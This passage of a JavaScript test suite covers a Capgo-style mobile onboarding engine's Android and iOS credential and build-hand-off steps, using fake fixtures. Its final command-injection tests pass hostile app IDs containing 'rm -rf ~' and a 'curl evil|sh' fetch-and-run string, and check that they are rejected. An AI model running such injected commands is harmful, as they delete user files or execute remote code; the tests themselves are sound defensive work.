  const facts = {
    capacitorProject: true,
    appId: 'com.acme.app',
    platformsDetected: ['android'],
    authenticated: true,
    appRegistered: true,
    androidProgress: progress,
    iosProgress: null,
  }
  const r = await decideAndroid(facts, deps)
  // BYO path: no package yet → android-package-select
  eq(r.state, 'android-package-select', `expected android-package-select for BYO path, got ${r.state}`)
})

// Test 10: no keystore yet → runStart returns keystore-method-select (interactive, not silent auto-generate)
await test('android bridge: runStart with no progress → interactive keystore-method-select (not auto-generate)', async () => {
  const deps = androidBridgeDeps()
  const r = await runStart(deps)
  eq(r.platform, 'android')
  eq(r.phase, 'credentials')
  // Short-circuit removed: now routes to interactive keystore-method-select
  eq(r.state, 'keystore-method-select', `expected keystore-method-select (interactive), got ${r.state}`)
  eq(r.kind, 'choice')
  ok(r.options && r.options.some(o => o.value === 'generate'), 'must have generate option')
  ok(r.options && r.options.some(o => o.value === 'existing'), 'must have existing option')
})

// ─── Plan 4: iOS credentials (granular shared-engine path, S6a) ──────────────
// The coarse decideIos/ios-finalize path is GONE: decideIos now drives the
// shared iOS flow engine (ios/flow.ts) step by step — verifying-key →
// verify-app → creating-certificate → creating-profile → saving-credentials →
// ask-build — with carried transients in the per-app session registry. The
// deep per-step assertions live in test-mcp-ios-flow.mjs; this block pins the
// driver-level contract the rest of this suite builds on.
const { decideIos } = await import('../src/build/onboarding/mcp/engine.ts')
const { clearAllSessions: clearIosSessions } = await import('../src/build/onboarding/mcp/session-state.ts')

// Fake iOS world: an in-memory progress store + canned IosEffectDeps that walk
// the granular create-new chain without fs or network. verify-app passes
// through via its fetch-failed branch by default (no listApps wired) — the
// parked verify-app gate behavior is covered in test-mcp-ios-flow.mjs.
function iosDeps(o = {}) {
  const { iosEffectDeps: iosOverrides, ...rest } = o
  let prog = null
  const iosEffectDeps = {
    verifyApiKey: async () => ({ teamId: 'T' }),
    generateCsr: () => ({ csr: 'CSR_PEM', privateKeyPem: 'PRIV_PEM' }),
    createCertificate: async () => ({ certificateId: 'C', certificateContent: 'CERT_DER', expirationDate: 'x', teamId: 'T' }),
    createP12: () => 'p12',
    createProfile: async () => ({ profileId: 'P', profileName: 'Capgo', profileBase64: 'prof' }),
    readFile: async () => Buffer.from('-----BEGIN PRIVATE KEY-----\nFAKE\n-----END PRIVATE KEY-----'),
    copyFile: async () => {},
    isMacOS: () => true,
    openExternal: () => {},
    loadProgress: async () => prog,
    saveProgress: async (_appId, p) => { prog = p },
    deleteProgress: async () => { prog = null },
    updateSavedCredentials: async () => {},
    loadSavedCredentials: async () => null,
    ...(iosOverrides || {}),
  }
  return {
    cwd: '/tmp/app',
    hasSavedKey: () => true,
    getAppId: async () => 'com.acme.app',
    detectPlatforms: async () => ['ios'],
    isAppRegistered: async () => true,
    loadProgress: async () => prog,
    loadAndroidProgress: async () => null,
    registerApp: async () => ({ ok: true }),
    readBuildRecord: async () => null,
    buildRecordPath: (appId, platform) => `/tmp/capgo-build-record-${appId}-${platform}.json`,
    iosEffectDeps,
    androidEffectDeps: minimalFakeDeps().androidEffectDeps,
    oauthSession: minimalFakeDeps().oauthSession,
    // D2: default non-macOS so existing tests pass unchanged
    canLaunchTerminal: () => false,
    launchBuildInTerminal: async () => ({ ok: false, error: 'not implemented' }),
    _setIosProgress: (p) => { prog = p },
    _getIosProgress: () => prog,
    ...rest,
  }
}

const iosFacts = (o = {}) => ({
  capacitorProject: true,
  appId: 'com.acme.app',
  platformsDetected: ['ios'],
  authenticated: true,
  appRegistered: true,
  androidProgress: null,
  iosProgress: null,
  ...o,
})

/** Minimal valid iOS progress skeleton for direct decideIos calls. */
function iosProgressFixture(o = {}) {
  const { completedSteps = {}, ...rest } = o
  return {
    platform: 'ios',
    appId: 'com.acme.app',
    startedAt: '2026-01-01T00:00:00.000Z',
    setupMethod: 'create-new',
    ...rest,
    completedSteps,
  }
}

await test('decideIos: no API key → human_gate ios-api-key (collects 3 fields)', async () => {
  clearIosSessions()
  const r = await decideIos(iosFacts(), iosDeps())
  eq(r.kind, 'human_gate')
  eq(r.state, 'ios-api-key')
  eq(r.collect.length, 3)
})

await test('decideIos: API key inputs present, not verified → granular chain runs through verifying-key to build-ready', async () => {
  clearIosSessions()
  const deps = iosDeps()
  const progress = iosProgressFixture({ keyId: 'A', issuerId: 'B', p8Path: '/p.p8' })
  deps._setIosProgress(progress)
  const r = await decideIos(iosFacts({ iosProgress: progress }), deps)
  // verifying-key → verify-app (fetch-failed pass-through) → cert → profile →
  // saving-credentials → ask-build, all auto — the next gate is build-ready.
  eq(r.kind, 'choice')
  eq(r.state, 'build-ready')
})

await test('decideIos: cert + profile markers persisted → saving-credentials tail → offers first build', async () => {
  clearIosSessions()
  const deps = iosDeps()
  const progress = iosProgressFixture({
    keyId: 'A',
    issuerId: 'B',
    p8Path: '/p.p8',
    completedSteps: {
      apiKeyVerified: { keyId: 'A', issuerId: 'B' },
      certificateCreated: { certificateId: 'C', expirationDate: 'x', teamId: 'T', p12Base64: 'p12' },
      profileCreated: { profileId: 'P', profileName: 'n', profileBase64: 'b' },
    },
  })
  deps._setIosProgress(progress)
  const r = await decideIos(iosFacts({ iosProgress: progress }), deps)
  eq(r.kind, 'choice')
  eq(r.state, 'build-ready')
})

await test('ios: full flow → provide ASC key → granular engine chain → offers build → runBuild rejected → use start_capgo_build', async () => {
  clearIosSessions()
  const deps = iosDeps({
    buildRecordPath: (appId, platform) => `/tmp/rec-${platform}.json`,
    readBuildRecord: async () => null,
  })
  const r1 = await runStart(deps)
  eq(r1.state, 'ios-api-key')
  const r2 = await runAdvance(deps, { keyId: 'ABC', issuerId: '1a2b', p8Path: '/tmp/AuthKey.p8' })
  eq(r2.kind, 'choice')
  eq(r2.state, 'build-ready')
  // The build offer points at start_capgo_build — a runBuild:true is the wrong tool and is rejected.
  const r3 = await runAdvance(deps, { runBuild: true, platform: 'ios' })
  eq(r3.kind, 'error', `expected error (use-start-tool), got ${r3.kind}`)
  eq(r3.state, 'build-use-start-tool', `expected build-use-start-tool, got ${r3.state}`)
  eq(r3.next.tool, 'start_capgo_build', 'next must point at start_capgo_build')
  eq(r3.next.with.platform, 'ios', 'next.with.platform must be ios')
})

await test('ios: verifying-key failure → structured error recovery (choice; retry + restart + exit + email-support)', async () => {
  clearIosSessions()
  const deps = iosDeps({
    iosEffectDeps: { verifyApiKey: async () => { throw new Error('cert limit reached') } },
  })
  await runStart(deps)
  const r = await runAdvance(deps, { keyId: 'ABC', issuerId: '1a2b', p8Path: '/tmp/AuthKey.p8' })
  eq(r.kind, 'choice')
  eq(r.state, 'error')
  ok(/cert limit reached/.test(r.summary), 'summary must surface the failing step message')
  const vals = r.options.map(o => o.value)
  for (const v of ['retry', 'restart', 'exit', 'email-support'])
    ok(vals.includes(v), `the error recovery must offer "${v}"`)
})

// ─── CI review follow-ups ─────────────────────────────────────────────────────
await test('android: runBuild:true (android) → rejected with a start_capgo_build pointer (not blocking)', async () => {
  const deps = androidBridgeDeps({
    readBuildRecord: async () => null,
  })
  // Set up progress at build-ready (all steps done + credentials saved)
  deps._setAndroidProgress(savedBuildReadyProgress()) // contract change (hostile-review 2026-06-12): runBuild now requires the credentials-saved marker
  const r = await runAdvance(deps, { runBuild: true, platform: 'android' })
  eq(r.kind, 'error', `expected error (use-start-tool), got ${r.kind}`)
  eq(r.state, 'build-use-start-tool', `expected build-use-start-tool, got ${r.state}`)
  eq(r.next.tool, 'start_capgo_build', 'next must point at start_capgo_build')
  eq(r.next.with.platform, 'android', 'next.with.platform must be android')
})

await test('android: skip build → onboarding completes (build-skipped)', async () => {
  const deps = androidBridgeDeps()
  const r = await runAdvance(deps, { runBuild: false, platform: 'android' })
  eq(r.kind, 'done')
  eq(r.state, 'build-skipped')
})

await test('both platforms: credential submission without platform resumes in-flight android (no loop to select)', async () => {
  const deps = androidBridgeDeps()
  // Set up android progress with keystore ready but not method chosen yet
  const keystoreProgress = {
    platform: 'android',
    appId: 'com.acme.app',
    startedAt: new Date().toISOString(),
    serviceAccountForkSeen: true,
    keystoreMethod: 'generate',
    keystoreAlias: 'release',
    keystoreStorePassword: 'storePw',
    keystoreKeyPassword: 'keyPw',
    _keystoreBase64: 'base64ks==',
    completedSteps: {
      keystoreReady: { keystorePath: 'android/app/release.p12', alias: 'release', isGenerated: true },
    },
  }
  deps._setAndroidProgress(keystoreProgress)
  // activePlatform should detect android is in-flight
  const r = await runAdvance(deps, {}) // no android input fields → should resume android
  ok(r.state !== 'platform-select', 'must not bounce back to platform selection')
  ok(r.platform === 'android', `should stay on android, got platform: ${r.platform}`)
  eq(r.state, 'service-account-method-select', `should resume to service-account-method-select, got ${r.state}`)
})

// ─── Task C2: build hand-off + checkBuild confirm ────────────────────────────

// Helper: progress at build-ready (all android credential steps done)
function buildReadyProgress() {
  return {
    platform: 'android',
    appId: 'com.acme.app',
    startedAt: new Date().toISOString(),
    serviceAccountForkSeen: true,
    serviceAccountMethod: 'generate',
    keystoreMethod: 'generate',
    keystoreAlias: 'release',
    keystoreStorePassword: 'storePw',
    keystoreKeyPassword: 'keyPw',
    _keystoreBase64: 'base64ks==',
    _serviceAccountKeyBase64: 'sakeybase64==',
    completedSteps: {
      keystoreReady: { keystorePath: 'android/app/release.p12', alias: 'release', isGenerated: true },
      googleSignInComplete: { email: 'user@example.com', googleSubject: 'sub123', scope: 'openid' },
      playAccountChosen: { developerId: '1234567890123456789' },
      gcpProjectChosen: { projectId: 'proj-1', displayName: 'Proj 1', createdByOnboarding: false },
      androidPackageChosen: { packageName: 'com.acme.app', source: 'gradle' },
      serviceAccountProvisioned: { email: 'sa@proj-1.iam.gserviceaccount.com', projectId: 'proj-1' },
      playInviteProvisioned: { developerId: '1234567890123456789', serviceAccountEmail: 'sa@proj-1.iam.gserviceaccount.com' },
    },
  }
}

await test('C2: runBuild:true (android) → use-start-tool corrective (start_capgo_build, no terminal command)', async () => {
  const deps = androidBridgeDeps({
    readBuildRecord: async () => null,
  })
  deps._setAndroidProgress(savedBuildReadyProgress()) // contract change (hostile-review 2026-06-12): runBuild now requires the credentials-saved marker
  const r = await runAdvance(deps, { runBuild: true, platform: 'android' })
  eq(r.kind, 'error', `expected error, got ${r.kind}`)
  eq(r.state, 'build-use-start-tool', `expected build-use-start-tool, got ${r.state}`)
  // The corrective carries NO terminal command/recordPath — the build is run by the tool, not the shell
  ok(!r.context, 'corrective must NOT carry a terminal command/recordPath')
  ok(r.next && r.next.tool === 'start_capgo_build', 'next must point at start_capgo_build')
  eq(r.next.with.platform, 'android', 'next.with.platform must be android')
  ok(!r.next.with.checkBuild, 'corrective must NOT route back through next_step({checkBuild})')
  eq(r.phase, 'build')
  eq(r.progress, 90)
})

await test('C2 confirm success: checkBuild:true + record present with status:success → kind:done, state:build-complete', async () => {
  const successRecord = {
    schemaVersion: 1,
    jobId: 'j1',
    appId: 'com.acme.app',
    platform: 'android',
    buildMode: 'release',
    status: 'success',
    outputUrl: 'https://capgo.app/d/abc',
    qrCodeAscii: '██QR██',
    qrCodePngPath: null,
    finishedAt: new Date().toISOString(),
  }
  const deps = androidBridgeDeps({
    readBuildRecord: async () => successRecord,
    buildRecordPath: (appId, platform) => `/tmp/capgo-build-record-${appId}-${platform}.json`,
  })
  deps._setAndroidProgress(buildReadyProgress())
  const r = await runAdvance(deps, { checkBuild: true })
  eq(r.kind, 'done', `expected done, got ${r.kind}`)
  eq(r.state, 'build-complete', `expected build-complete, got ${r.state}`)
  ok(r.summary && r.summary.includes('/d/abc'), 'summary must include the outputUrl path')
  ok(r.context && r.context.outputUrl === 'https://capgo.app/d/abc', 'context.outputUrl must match')
  eq(r.context.qrCodeAscii, '██QR██', 'context.qrCodeAscii must match')
  eq(r.phase, 'done')
  eq(r.progress, 100)
})

await test('C2 confirm pending: checkBuild:true + record null → kind:human_gate, state:build-waiting, next.with.checkBuild:true', async () => {
  const deps = androidBridgeDeps({
    readBuildRecord: async () => null,
    buildRecordPath: (appId, platform) => `/tmp/capgo-build-record-${appId}-${platform}.json`,
  })
  deps._setAndroidProgress(buildReadyProgress())
  const r = await runAdvance(deps, { checkBuild: true })
  eq(r.kind, 'human_gate', `expected human_gate, got ${r.kind}`)
  eq(r.state, 'build-waiting', `expected build-waiting, got ${r.state}`)
  ok(r.next && r.next.with && r.next.with.checkBuild === true, 'next.with.checkBuild must be true')
  eq(r.phase, 'build')
})

await test('C2 confirm failed: checkBuild:true + record with status:error → kind:error, state:build-failed', async () => {
  const failedRecord = {
    schemaVersion: 1,
    jobId: 'j2',
    appId: 'com.acme.app',
    platform: 'android',
    buildMode: 'release',
    status: 'error',
    outputUrl: null,
    qrCodeAscii: null,
    qrCodePngPath: null,
    finishedAt: new Date().toISOString(),
  }
  const deps = androidBridgeDeps({
    readBuildRecord: async () => failedRecord,
    buildRecordPath: (appId, platform) => `/tmp/capgo-build-record-${appId}-${platform}.json`,
  })
  deps._setAndroidProgress(buildReadyProgress())
  const r = await runAdvance(deps, { checkBuild: true })
  eq(r.kind, 'error', `expected error, got ${r.kind}`)
  eq(r.state, 'build-failed', `expected build-failed, got ${r.state}`)
  ok(r.summary && r.summary.includes('error'), 'summary must mention the status')
  eq(r.phase, 'build')
})

// ─── Task 5: persistAndroidInput — BYO path, validation recovery, resume ────────

// Task 5a: BYO path — serviceAccountMethod:existing → package → sa-json-existing-path → validating → build-ready
await test('Task5: BYO path: serviceAccountMethod:existing → android-package-select', async () => {
  const deps = androidBridgeDeps()
  // start with keystore-ready progress + serviceAccountForkSeen
  const keystoreProgress = {
    platform: 'android',
    appId: 'com.acme.app',
    startedAt: new Date().toISOString(),
    serviceAccountForkSeen: true,
    keystoreMethod: 'generate',
    keystoreAlias: 'release',
    keystoreStorePassword: 'storePw',
    keystoreKeyPassword: 'keyPw',
    _keystoreBase64: 'base64ks==',
    completedSteps: {
      keystoreReady: { keystorePath: 'android/app/release.p12', alias: 'release', isGenerated: true },
    },
  }
  deps._setAndroidProgress(keystoreProgress)
  // User picks 'existing' SA method via persistAndroidInput
  const r1 = await runAdvance(deps, { serviceAccountMethod: 'existing' })
  eq(r1.platform, 'android')
  // With serviceAccountMethod=existing and no packageChosen yet → android-package-select
  eq(r1.state, 'android-package-select', `expected android-package-select, got ${r1.state}`)
})

await test('Task5: BYO path: androidPackage → sa-json-existing-path human_gate', async () => {
  const deps = androidBridgeDeps()
  const keystoreProgress = {
    platform: 'android',
    appId: 'com.acme.app',
    startedAt: new Date().toISOString(),
    serviceAccountForkSeen: true,
    serviceAccountMethod: 'existing',
    keystoreMethod: 'generate',
    keystoreAlias: 'release',
    keystoreStorePassword: 'storePw',
    keystoreKeyPassword: 'keyPw',
    _keystoreBase64: 'base64ks==',
    completedSteps: {
      keystoreReady: { keystorePath: 'android/app/release.p12', alias: 'release', isGenerated: true },
    },
  }
  deps._setAndroidProgress(keystoreProgress)
  const r = await runAdvance(deps, { androidPackage: 'com.acme.app' })
  eq(r.platform, 'android')
  // After package chosen → sa-json-existing-path
  eq(r.state, 'sa-json-existing-path', `expected sa-json-existing-path, got ${r.state}`)
  eq(r.kind, 'human_gate')
  ok(r.collect && r.collect.some(c => c.field === 'serviceAccountJsonPath'), 'must collect serviceAccountJsonPath')
})

await test('Task5: BYO path: serviceAccountJsonPath → validating → build-ready, updateSavedCredentials 5-key shape', async () => {
  const deps = androidBridgeDeps()
  const keystoreProgress = {
    platform: 'android',
    appId: 'com.acme.app',
    startedAt: new Date().toISOString(),
    serviceAccountForkSeen: true,
    serviceAccountMethod: 'existing',
    keystoreMethod: 'generate',
    keystoreAlias: 'release',
    keystoreStorePassword: 'storePw',
    keystoreKeyPassword: 'keyPw',
    _keystoreBase64: 'base64ks==',
    completedSteps: {
      keystoreReady: { keystorePath: 'android/app/release.p12', alias: 'release', isGenerated: true },
      androidPackageChosen: { packageName: 'com.acme.app', source: 'user-input' },
    },
  }
  deps._setAndroidProgress(keystoreProgress)
  // Submit the SA JSON path — validates OK → saves credentials → build-ready
  const r = await runAdvance(deps, { serviceAccountJsonPath: '/tmp/sa.json' })
  eq(r.platform, 'android')
  eq(r.state, 'build-ready', `expected build-ready, got ${r.state}`)
  eq(r.kind, 'choice')
  // updateSavedCredentials must have been called with the 5-key shape
  const creds = deps._savedCreds()
  ok(creds, 'updateSavedCredentials must have been called')
  ok('ANDROID_KEYSTORE_FILE' in creds, 'must include ANDROID_KEYSTORE_FILE')
  ok('KEYSTORE_KEY_ALIAS' in creds, 'must include KEYSTORE_KEY_ALIAS')
  ok('KEYSTORE_STORE_PASSWORD' in creds, 'must include KEYSTORE_STORE_PASSWORD')
  ok('KEYSTORE_KEY_PASSWORD' in creds, 'must include KEYSTORE_KEY_PASSWORD')
  ok('PLAY_CONFIG_JSON' in creds, 'must include PLAY_CONFIG_JSON from BYO file')
})

// Task 5b: validation-failed recovery — saMethodChoice:oauth → google-sign-in gate
await test('Task5: validation-failed: validateServiceAccountJson → ok:false → sa-json-validation-failed choice', async () => {
  const deps = androidBridgeDeps()
  // Override validateServiceAccountJson to fail (mutate the same deps instance)
  deps.androidEffectDeps.validateServiceAccountJson = async () => ({
    ok: false,
    kind: 'no-app-access',
    message: 'SA has no access to the Play app',
  })

  const keystoreProgress = {
    platform: 'android',
    appId: 'com.acme.app',
    startedAt: new Date().toISOString(),
    serviceAccountForkSeen: true,
    serviceAccountMethod: 'existing',
    keystoreMethod: 'generate',
    keystoreAlias: 'release',
    keystoreStorePassword: 'storePw',
    keystoreKeyPassword: 'keyPw',
    _keystoreBase64: 'base64ks==',
    completedSteps: {
      keystoreReady: { keystorePath: 'android/app/release.p12', alias: 'release', isGenerated: true },
      androidPackageChosen: { packageName: 'com.acme.app', source: 'user-input' },
    },
  }
  deps._setAndroidProgress(keystoreProgress)

  // Submit SA path → validation fails → sa-json-validation-failed
  const r = await runAdvance(deps, { serviceAccountJsonPath: '/tmp/bad.json' })
  eq(r.platform, 'android')
  eq(r.state, 'sa-json-validation-failed', `expected sa-json-validation-failed, got ${r.state}`)
  eq(r.kind, 'choice')
  ok(r.summary && r.summary.includes('SA has no access'), 'summary must include validation message')
  ok(r.options && r.options.some(o => o.value === 'retry'), 'must have retry option')
  ok(r.options.some(o => o.value === 'save-anyway'), 'must have save-anyway option')
  ok(r.options.some(o => o.value === 'oauth'), 'must have oauth option')
  ok(r.next && r.next.with && 'saMethodChoice' in r.next.with, 'next must carry saMethodChoice')
})

await test('Task5: validation-failed: saMethodChoice:oauth → google-sign-in gate', async () => {
  const deps = androidBridgeDeps()
  deps.androidEffectDeps.validateServiceAccountJson = async () => ({
    ok: false, kind: 'no-app-access', message: 'SA has no access',
  })
  const keystoreProgress = {
    platform: 'android',
    appId: 'com.acme.app',
    startedAt: new Date().toISOString(),
    serviceAccountForkSeen: true,
    serviceAccountMethod: 'existing',
    serviceAccountJsonPath: '/tmp/bad.json',
    keystoreMethod: 'generate',
    keystoreAlias: 'release',
    keystoreStorePassword: 'storePw',
    keystoreKeyPassword: 'keyPw',
    _keystoreBase64: 'base64ks==',
    completedSteps: {
      keystoreReady: { keystorePath: 'android/app/release.p12', alias: 'release', isGenerated: true },
      androidPackageChosen: { packageName: 'com.acme.app', source: 'user-input' },
    },
  }
  deps._setAndroidProgress(keystoreProgress)
  // saMethodChoice:oauth → switches to generate → routes to google-sign-in gate
  const r = await runAdvance(deps, { saMethodChoice: 'oauth' })
  eq(r.platform, 'android')
  eq(r.state, 'google-sign-in', `expected google-sign-in after oauth switch, got ${r.state}`)
  eq(r.kind, 'human_gate')
})

await test('Task5: validation-failed: saMethodChoice:retry → back to sa-json-existing-path', async () => {
  const deps = androidBridgeDeps()
  deps.androidEffectDeps.validateServiceAccountJson = async () => ({
    ok: false, kind: 'no-app-access', message: 'SA has no access',
  })
  const keystoreProgress = {
    platform: 'android',
    appId: 'com.acme.app',
    startedAt: new Date().toISOString(),
    serviceAccountForkSeen: true,
    serviceAccountMethod: 'existing',
    serviceAccountJsonPath: '/tmp/bad.json',
    keystoreMethod: 'generate',
    keystoreAlias: 'release',
    keystoreStorePassword: 'storePw',
    keystoreKeyPassword: 'keyPw',
    _keystoreBase64: 'base64ks==',
    completedSteps: {
      keystoreReady: { keystorePath: 'android/app/release.p12', alias: 'release', isGenerated: true },
      androidPackageChosen: { packageName: 'com.acme.app', source: 'user-input' },
    },
  }
  deps._setAndroidProgress(keystoreProgress)
  // saMethodChoice:retry → clears path → back to sa-json-existing-path
  const r = await runAdvance(deps, { saMethodChoice: 'retry' })
  eq(r.platform, 'android')
  eq(r.state, 'sa-json-existing-path', `expected sa-json-existing-path after retry, got ${r.state}`)
  eq(r.kind, 'human_gate')
})

// Task 5c: Resume — progress at playAccountChosen but no gcpProjectChosen → gcp-projects-loading → gcp-projects-select
await test('Task5: resume: playAccountChosen but no gcpProjectChosen → gcp-projects-select', async () => {
  const deps = androidBridgeDeps()
  const progress = {
    platform: 'android',
    appId: 'com.acme.app',
    startedAt: new Date().toISOString(),
    serviceAccountForkSeen: true,
    serviceAccountMethod: 'generate',
    keystoreMethod: 'generate',
    keystoreAlias: 'release',
    keystoreStorePassword: 'storePw',
    keystoreKeyPassword: 'keyPw',
    _keystoreBase64: 'base64ks==',
    _oauthRefreshToken: 'rt123',
    completedSteps: {
      keystoreReady: { keystorePath: 'android/app/release.p12', alias: 'release', isGenerated: true },
      googleSignInComplete: { email: 'user@example.com', googleSubject: 'sub123', scope: 'openid' },
      playAccountChosen: { developerId: '1234567890123456789' },
      // NOTE: no gcpProjectChosen
    },
  }
  deps._setAndroidProgress(progress)
  const facts = {
    capacitorProject: true, appId: 'com.acme.app', platformsDetected: ['android'],
    authenticated: true, appRegistered: true,
    androidProgress: progress, iosProgress: null,
  }
  // decideAndroid should load GCP projects then show gcp-projects-select
  const r = await decideAndroid(facts, deps)
  eq(r.state, 'gcp-projects-select', `expected gcp-projects-select on resume, got ${r.state}`)
  eq(r.kind, 'choice')
  ok(r.options && r.options.some(o => o.value === 'proj-1'), 'must list the project from fake listProjects')
})

// ─── FIX 1: iOS build hand-off carries platform through checkBuild ───────────

await test('FIX1: iOS runBuild → use-start-tool corrective (platform ios); checkBuild reads ios record path', async () => {
  // Track which path readBuildRecord was called with
  let calledWithPath = null
  const deps = iosDeps({
    // distinct paths per platform so we can assert the right one was used
    buildRecordPath: (appId, platform) => `/tmp/rec-${platform}.json`,
    readBuildRecord: async (path) => {
      calledWithPath = path
      // Return a success record so we reach build-complete
      return {
        schemaVersion: 1,
        jobId: 'ios-job-1',
        appId: 'com.acme.app',
        platform: 'ios',
        buildMode: 'release',
        status: 'success',
        outputUrl: 'https://capgo.app/d/ios-test',
        qrCodeAscii: null,
        qrCodePngPath: null,
        finishedAt: new Date().toISOString(),
      }
    },
  })

  // Drive to build-ready
  await runStart(deps)
  await runAdvance(deps, { keyId: 'ABC', issuerId: '1a2b', p8Path: '/tmp/AuthKey.p8' })

  // runBuild:true is the wrong tool — engine rejects it and points at start_capgo_build (carrying platform:ios)
  const corrective = await runAdvance(deps, { runBuild: true, platform: 'ios' })
  eq(corrective.kind, 'error', `expected error, got ${corrective.kind}`)
  eq(corrective.state, 'build-use-start-tool', `expected build-use-start-tool, got ${corrective.state}`)
  eq(corrective.next.tool, 'start_capgo_build', 'corrective must point at start_capgo_build')
  eq(corrective.next.with.platform, 'ios', 'next.with.platform must be ios (FIX 1)')

  // checkBuild:true with platform:ios → must read the ios record path (not android)
  const result = await runAdvance(deps, { checkBuild: true, platform: 'ios' })
  eq(result.state, 'build-complete', `expected build-complete, got ${result.state}`)
  eq(result.kind, 'done', `expected done, got ${result.kind}`)
  // Verify readBuildRecord was called with the ios path, not the android path
  eq(calledWithPath, '/tmp/rec-ios.json', `readBuildRecord must be called with ios path, got: ${calledWithPath}`)
})

await test('FIX1: iOS checkBuild with no-record → build-waiting carries platform:ios in next.with', async () => {
  const deps = iosDeps({
    buildRecordPath: (appId, platform) => `/tmp/rec-${platform}.json`,
    readBuildRecord: async () => null,
  })
  await runStart(deps)
  await runAdvance(deps, { keyId: 'ABC', issuerId: '1a2b', p8Path: '/tmp/AuthKey.p8' })
  const waiting = await runAdvance(deps, { checkBuild: true, platform: 'ios' })
  eq(waiting.state, 'build-waiting', `expected build-waiting, got ${waiting.state}`)
  ok(waiting.next && waiting.next.with, 'next.with must exist')
  eq(waiting.next.with.platform, 'ios', 'build-waiting next.with.platform must be ios (FIX 1)')
  eq(waiting.next.with.checkBuild, true, 'build-waiting next.with.checkBuild must be true')
})

// ─── FIX 4: buildDoneResult — null outputUrl uses fallback, no emoji ─────────

await test('FIX4: buildDoneResult with null outputUrl uses fallback text and has no emoji', async () => {
  const deps = iosDeps({
    buildRecordPath: (appId, platform) => `/tmp/rec-${platform}.json`,
    readBuildRecord: async () => ({
      schemaVersion: 1,
      jobId: 'ios-null-url',
      appId: 'com.acme.app',
      platform: 'ios',
      buildMode: 'release',
      status: 'success',
      outputUrl: null,
      qrCodeAscii: null,
      qrCodePngPath: null,
      finishedAt: new Date().toISOString(),
    }),
  })
  await runStart(deps)
  await runAdvance(deps, { keyId: 'ABC', issuerId: '1a2b', p8Path: '/tmp/AuthKey.p8' })
  const result = await runAdvance(deps, { checkBuild: true, platform: 'ios' })
  eq(result.state, 'build-complete')
  ok(result.summary && !result.summary.includes('null'), 'summary must not say "null" when outputUrl is null')
  ok(result.summary.includes('see the build record'), 'summary must use fallback text for null outputUrl')
  ok(!result.summary.includes('🎉'), 'summary must not contain emoji (FIX 4)')
})

// ─── Task D2: checkBuild reads the build record ───────────────────────────────

await test('D2 checkBuild: record present + success → build-complete (unchanged)', async () => {
  const successRecord = {
    schemaVersion: 1,
    jobId: 'j-launched',
    appId: 'com.acme.app',
    platform: 'android',
    buildMode: 'release',
    status: 'success',
    outputUrl: 'https://capgo.app/d/launched',
    qrCodeAscii: null,
    qrCodePngPath: null,
    finishedAt: new Date().toISOString(),
  }
  const deps = androidBridgeDeps({
    readBuildRecord: async () => successRecord,
    buildRecordPath: (appId, platform) => `/tmp/capgo-build-record-${appId}-${platform}.json`,
    canLaunchTerminal: () => true,
    launchBuildInTerminal: async () => ({ ok: true }),
  })
  deps._setAndroidProgress(buildReadyProgress())
  // checkBuild:true reads the same record regardless of launch path
  const r = await runAdvance(deps, { checkBuild: true, platform: 'android' })
  eq(r.kind, 'done', `expected done, got ${r.kind}`)
  eq(r.state, 'build-complete', `expected build-complete, got ${r.state}`)
  ok(r.summary && r.summary.includes('/d/launched'), 'summary must include the outputUrl path')
})

// ─── Command-injection guard: unsafe appId ───────────────────────────────────

await test('runBuild: evil appId → kind:error, state:build-appid-unsafe, launchBuildInTerminal NOT called', async () => {
  let launchCalled = false
  const deps = androidBridgeDeps({
    // Override getAppId to return a malicious value
    getAppId: async () => 'com.evil; rm -rf ~',
    buildRecordPath: (appId, platform) => `/tmp/capgo-build-record-${appId}-${platform}.json`,
    readBuildRecord: async () => null,
    canLaunchTerminal: () => true,
    launchBuildInTerminal: async () => { launchCalled = true; return { ok: true } },
  })
  deps._setAndroidProgress(buildReadyProgress())
  const r = await runAdvance(deps, { runBuild: true, platform: 'android' })
  eq(r.kind, 'error', `expected kind:error, got ${r.kind}`)
  eq(r.state, 'build-appid-unsafe', `expected state:build-appid-unsafe, got ${r.state}`)
  eq(r.phase, 'build', `expected phase:build, got ${r.phase}`)
  ok(r.summary && r.summary.includes("isn't a valid package name"), `summary must mention invalid package name, got: ${r.summary}`)
  ok(r.summary.includes('capacitor config'), `summary must mention "capacitor config", got: ${r.summary}`)
  eq(launchCalled, false, 'launchBuildInTerminal must NOT be called for unsafe appId')
  ok(!('command' in (r.context ?? {})), 'result must not contain context.command for unsafe appId')
})

await test('runBuild: evil appId $(injection) → kind:error, state:build-appid-unsafe', async () => {
  const deps = androidBridgeDeps({
    getAppId: async () => 'com.evil$(curl evil|sh)',
    buildRecordPath: (appId, platform) => `/tmp/capgo-build-record-${appId}-${platform}.json`,
    readBuildRecord: async () => null,
    canLaunchTerminal: () => false,
    launchBuildInTerminal: async () => ({ ok: false, error: 'not called' }),
  })
  deps._setAndroidProgress(buildReadyProgress())
  const r = await runAdvance(deps, { runBuild: true, platform: 'android' })
  eq(r.kind, 'error')
  eq(r.state, 'build-appid-unsafe')
})

await test('checkBuild: evil appId → kind:error, state:build-appid-unsafe', async () => {
  const deps = androidBridgeDeps({
    getAppId: async () => 'com.evil; rm -rf ~',
    buildRecordPath: (appId, platform) => `/tmp/capgo-build-record-${appId}-${platform}.json`,
    readBuildRecord: async () => ({
      schemaVersion: 1,
      jobId: 'j1',
      appId: 'com.evil; rm -rf ~',
      platform: 'android',
      buildMode: 'release',
      status: 'success',
      outputUrl: 'https://capgo.app/d/abc',
      qrCodeAscii: null,
      qrCodePngPath: null,
      finishedAt: new Date().toISOString(),
    }),
  })
  deps._setAndroidProgress(buildReadyProgress())
  const r = await runAdvance(deps, { checkBuild: true, platform: 'android' })
  eq(r.kind, 'error', `expected kind:error for checkBuild with evil appId, got ${r.kind}`)
  eq(r.state, 'build-appid-unsafe', `expected state:build-appid-unsafe, got ${r.state}`)
})

await test('runBuild: valid appId com.acme.app passes the unsafe guard → use-start-tool corrective', async () => {
  const deps = androidBridgeDeps({
    getAppId: async () => 'com.acme.app',
  })
  deps._setAndroidProgress(savedBuildReadyProgress()) // contract: runBuild now requires the credentials-saved marker
  const r = await runAdvance(deps, { runBuild: true, platform: 'android' })
  ok(r.state !== 'build-appid-unsafe', 'valid appId must not trigger the unsafe guard')
  eq(r.state, 'build-use-start-tool', `expected build-use-start-tool, got ${r.state}`)
  eq(r.next.tool, 'start_capgo_build', 'corrective must point at start_capgo_build')
})

// ─── Task A2: mapAndroidView — keystore step mappings ────────────────────────

